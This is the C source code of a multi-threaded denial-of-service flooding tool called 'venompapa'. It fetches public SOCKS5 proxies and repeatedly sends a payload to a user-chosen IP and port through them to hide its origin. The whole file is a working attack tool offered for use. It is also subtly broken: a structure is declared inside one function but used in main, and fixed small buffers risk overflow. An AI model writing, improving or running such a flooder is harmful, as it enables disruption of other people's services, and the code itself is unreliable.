#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <curl/curl.h>

#define PROXY_LIST_URL "https://www.proxy-list.download/api/v1/get?type=socks5"

// Structure to store proxy list
typedef struct {
    char proxies[100][50];
    int count;
} ProxyList;

// Function to fetch proxy list from the internet
size_t write_callback(void *ptr, size_t size, size_t nmemb, void *data) {
    strncat((char *)data, (char *)ptr, size * nmemb);
    return size * nmemb;
}

void fetch_proxies(ProxyList *proxy_list) {
    CURL *curl;
    CURLcode res;
    char response[5000] = {0};

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, PROXY_LIST_URL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    
    curl_global_cleanup();

    // Split proxies by new line
    char *token = strtok(response, "\n");
    proxy_list->count = 0;
    
    while (token != NULL && proxy_list->count < 100) {
        strncpy(proxy_list->proxies[proxy_list->count], token, 50);
        proxy_list->count++;
        token = strtok(NULL, "\n");
    }
}

// Function to connect to a proxy and establish a SOCKS5 tunnel
int connect_to_proxy(const char *proxy, const char *target_ip, int target_port) {
    int sock;
    struct sockaddr_in proxy_addr;
    unsigned char request[10], response[10];
    char proxy_ip[20];
    int proxy_port;

    sscanf(proxy, "%[^:]:%d", proxy_ip, &proxy_port);

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        return -1;
    }

    memset(&proxy_addr, 0, sizeof(proxy_addr));
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy_port);
    proxy_addr.sin_addr.s_addr = inet_addr(proxy_ip);

    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        perror("Connection to proxy failed");
        close(sock);
        return -1;
    }

    request[0] = 0x05;
    request[1] = 0x01;
    request[2] = 0x00;

    send(sock, request, 3, 0);
    recv(sock, response, 2, 0);

    if (response[1] != 0x00) {
        fprintf(stderr, "SOCKS5 authentication failed\n");
        close(sock);
        return -1;
    }

    request[0] = 0x05;
    request[1] = 0x01;
    request[2] = 0x00;
    request[3] = 0x01;

    inet_pton(AF_INET, target_ip, &request[4]);
    request[8] = (target_port >> 8) & 0xFF;
    request[9] = target_port & 0xFF;

    send(sock, request, 10, 0);
    recv(sock, response, 10, 0);

    if (response[1] != 0x00) {
        fprintf(stderr, "SOCKS5 connection request failed\n");
        close(sock);
        return -1;
    }

    return sock;
}

// Attack function
void *attack(void *arg) {
    struct thread_data {
        char *ip;
        int port;
        int time;
        ProxyList *proxy_list;
    };
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    time_t endtime;

    char *payloads[] = {
        "\x31,\x31"
    };

    for (int i = 0; i < data->proxy_list->count; i++) {
        printf("[*] Trying Proxy: %s\n", data->proxy_list->proxies[i]);
        sock = connect_to_proxy(data->proxy_list->proxies[i], data->ip, data->port);
        
        if (sock > 0) {
            break;  
        }
    }

    if (sock < 0) {
        printf("[!] No working proxy found!\n");
        pthread_exit(NULL);
    }

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (send(sock, payloads[i], strlen(payloads[i]), 0) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: ./venompapa ip port time threads\n");
        exit(1);
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    ProxyList proxy_list;
    
    printf("[*] Fetching proxies...\n");
    fetch_proxies(&proxy_list);
    
    if (proxy_list.count == 0) {
        printf("[!] No proxies found. Exiting...\n");
        exit(1);
    }

    printf("[*] Loaded %d proxies.\n", proxy_list.count);
    printf("[*] Flood started on %s:%d for %d seconds with %d threads (via proxy)\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;
        data->proxy_list = &proxy_list;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
        printf("[+] Launched thread %d\n", i + 1);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("[*] Attack finished\n");
    return 0;
}
